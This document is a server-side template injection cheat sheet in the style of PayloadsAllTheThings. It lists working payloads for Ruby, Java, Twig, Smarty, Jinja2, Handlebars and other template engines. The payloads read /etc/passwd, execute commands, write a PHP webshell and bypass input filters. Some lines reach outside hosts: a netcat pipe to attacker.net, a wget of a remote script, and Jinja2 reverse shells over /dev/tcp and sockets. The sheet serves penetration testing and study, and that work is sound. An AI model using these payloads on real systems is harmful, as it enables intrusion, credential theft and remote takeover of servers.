# Server Side Templates Injection

> Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages

## Table of Contents

-   **[Tools](#tools)**
-   **[Methodology](#methodology)**

**Engines:**

-   [Ruby](#ruby)
-   [ERB](#erb)
-   [Slim](#slim)
-   [Java](#java)
-   [Expression Language EL](#expression-language-el)
-   [Twig](#twig)
-   [Smarty](#smarty)
-   [Freemarker](#freemarker)
-   [Pebble](#pebble)
-   [Jade / Codepen](#jade---codepen)
-   [Velocity](#velocity)
-   [Mako](#mako)
-   [Jinja2](#jinja2)
-   [Jinjava](#jinjava)
-   [Handlebars](#handlebars)
-   [ASP.NET Razor](#aspnet-razor)
-   [Tornado](#tornado)

## Tools

Recommended tool: [Tplmap](https://github.com/epinna/tplmap) e.g:

    python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
    python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
    python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade

# Methodology

[![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Images/serverside.png?raw=true)

## Ruby

### Ruby - Basic injections

### ERB:

    <%= 7 * 7 %>

### Slim:

    #{ 7 * 7 }

**Ruby - Retrieve /etc/passwd**

    <%= File.open('/etc/passwd').read %>

**Ruby - List files and directories**

    <%= Dir.entries('/') %>

[](#ruby---code-execution)

**Ruby - Code execution**

- Execute code using SSTI for ERB engine.

  ```
    <%= system('cat /etc/passwd') %>
    <%= `ls /` %>
    <%= IO.popen('ls /').readlines()  %>
    <% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
    <% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
  ```

- Execute code using SSTI for Slim engine.

    `#{ %x|env| }`


## Java

### Java - Basic injection

    ${7*7}
    ${{7*7}}
    ${class.getClassLoader()}
    ${class.getResource("").getPath()}
    ${class.getResource("../../../../../index.htm").getContent()}

### Java - Retrieve the system’s environment variables

    ${T(java.lang.System).getenv()}

### Java - Retrieve /etc/passwd

    ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}

    ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}

## Expression Language EL

### Expression Language EL - Basic injection

    ${1+1} 
    #{1+1}

### Expression Language EL - Code Execution

    // Common RCE payloads
    ''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
    ''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

    // Method using Runtime
    #{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
    #{session.getAttribute("rtc").setAccessible(true)}
    #{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

    // Method using processbuilder
    ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
    ${request.getAttribute("c").add("cmd.exe")}
    ${request.getAttribute("c").add("/k")}
    ${request.getAttribute("c").add("ping x.x.x.x")}
    ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
    ${request.getAttribute("a")}

    // Method using Reflection & Invoke
    ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

    // Method using ScriptEngineManager one-liner
    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

    // Method using ScriptEngineManager
    ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}

## Twig

### Twig - Basic injection

    {{7*7}}
    {{7*'7'}} would result in 49
    {{dump(app)}}
    {{app.request.server.all|join(',')}}

### Twig - Template format

    $output = $twig > render (
      'Dear' . $_GET['custom_greeting'],
      array("first_name" => $user.first_name)
    );

    $output = $twig > render (
      "Dear {first_name}",
      array("first_name" => $user.first_name)
    );

### Twig - Arbitrary File Reading

    "{{'/etc/passwd'|file_excerpt(1,30)}}"@

### Twig - Code execution

    {{self}}
    {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
    {{['id']|filter('system')}}
    {{['cat\x20/etc/passwd']|filter('system')}}
    {{['cat$IFS/etc/passwd']|filter('system')}}

#### Example with an email passing FILTER\_VALIDATE\_EMAIL PHP:

    POST /subscribe?0=cat+/etc/passwd HTTP/1.1
    email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld

## Smarty

    {$smarty.version}
    {php}echo `id`;{/php}
    {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

## Freemarker

You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

### Freemarker - Basic injection

The template can be `${3*3}` or the legacy `#{3*3}`

### Freemarker - Code execution

    <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
    [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
    ${"freemarker.template.utility.Execute"?new()("id")}

## Pebble

### Pebble - Basic injection

    {{ someString.toUPPERCASE() }}

### Pebble - Code execution

- **Old version of Pebble ( \< version 3.0.9):** `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`

- **New version of Pebble :**

```
    {% set cmd = 'id' %}
    {% set bytes = (1).TYPE
         .forName('java.lang.Runtime')
         .methods[6]
         .invoke(null,null)
         .exec(cmd)
         .inputStream
         .readAllBytes() %}
    {{ (1).TYPE
         .forName('java.lang.String')
         .constructors[0]
         .newInstance(([bytes]).toArray()) }}
  ```````

[](#jade--codepen)

## Jade / Codepen

    - var x = root.process
    - x = x.mainModule.require
    - x = x('child_process')
    = x.exec('id | nc attacker.net 80')

    #{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

## Velocity

    #set($str=$class.inspect("java.lang.String").type)
    #set($chr=$class.inspect("java.lang.Character").type)
    #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
    $ex.waitFor()
    #set($out=$ex.getInputStream())
    #foreach($i in [1..$out.available()])
    $str.valueOf($chr.toChars($out.read()))
    #end

## Mako

    <%
    import os
    x=os.popen('id').read()
    %>
    ${x}

## Jinja2

[Official website](http://jinja.pocoo.org/)

> Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.

### Jinja2 - Basic injection

    {{4*4}}[[5*5]]
    {{7*'7'}} would result in 7777777
    {{config.items()}}

Jinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on Flask application.

### Jinja2 - Template format

    {% extends "layout.html" %}
    {% block body %}
      <ul>
      {% for user in users %}
        <li><a href="{{ user.url }}">{{ user.username }}</a></li>
      {% endfor %}
      </ul>
    {% endblock %}

### Jinja2 - Debug Statement

If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.

    <pre>{% debug %}</pre>

Source: [https://jinja.palletsprojects.com/en/2.11.x/templates/\#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### Jinja2 - Dump all used classes

    {{ [].class.base.subclasses() }}
    {{''.class.mro()[1].subclasses()}}
    {{ ''.__class__.__mro__[2].__subclasses__() }}

### Jinja2 - Dump all config variables

    {% for key, value in config.iteritems() %}
        <dt>{{ key|e }}</dt>
        <dd>{{ value|e }}</dd>
    {% endfor %}

### Jinja2 - Read remote file

    # ''.__class__.__mro__[2].__subclasses__()[40] = File class
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    {{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}

### Jinja2 - Write into remote file

    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}

### Jinja2 - Remote Code Execution

- **subprocess.Popen**

  ***NOTE: The number 396 will vary depending of the application.***
  ```
    {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
    {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
  ```

- **subprocess.Popen (without guessing the offset)**

  ```
    {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
  ```

- Simply modification of payload to clean up output and facilitate command input ([https://twitter.com/SecGus/status/1198976764351066113](https://twitter.com/SecGus/status/1198976764351066113)) In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
  ```
    {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
  ```

- **Writing an evil config file**
  ```
    # evil config
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }} 

    # load the evil config
    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

    # connect to evil host
    {{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }} 
  ```

### Jinja2 - Filter bypass

    request.__class__
    request["__class__"]

**Bypassing `_`**

    http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

    {{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
    {{request|attr(["_"*2,"class","_"*2]|join)}}
    {{request|attr(["__","class","__"]|join)}}
    {{request|attr("__class__")}}
    {{request.__class__}}

**Bypassing `[` and `]`**

    http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
    or
    http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

**Bypassing `|join`**

    http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_

Bypassing most common filters ('.','\_','|join','[',']','mro' and 'base') by [https://twitter.com/SecGus](https://twitter.com/SecGus):

    {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

## Jinjava

### Jinjava - Basic injection

    {{'a'.toUpperCase()}} would result in 'A'
    {{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206

Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)

### Jinjava - Command execution

Fixed by [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)

    {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

    {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

    {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}


    {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

## Handlebars

### Handlebars - Command Execution

    {{#with "s" as |string|}}
      {{#with "e"}}
        {{#with split as |conslist|}}
          {{this.pop}}
          {{this.push (lookup string.sub "constructor")}}
          {{this.pop}}
          {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('ls -la');"}}
            {{this.pop}}
            {{#each conslist}}
              {{#with (string.sub.apply 0 codelist)}}
                {{this}}
              {{/with}}
            {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}

## ASP.NET Razor

### ASP.NET Razor - Basic injection

    @(1+2)

### ASP.NET Razor - Command execution

    @{
      // C# code
    }
    

## Tornado

### Detection

`{{7*7}}` will return 49

### Command Execution

`{% SINGLE-LINE-PYTHON-CODE-HERE %}`

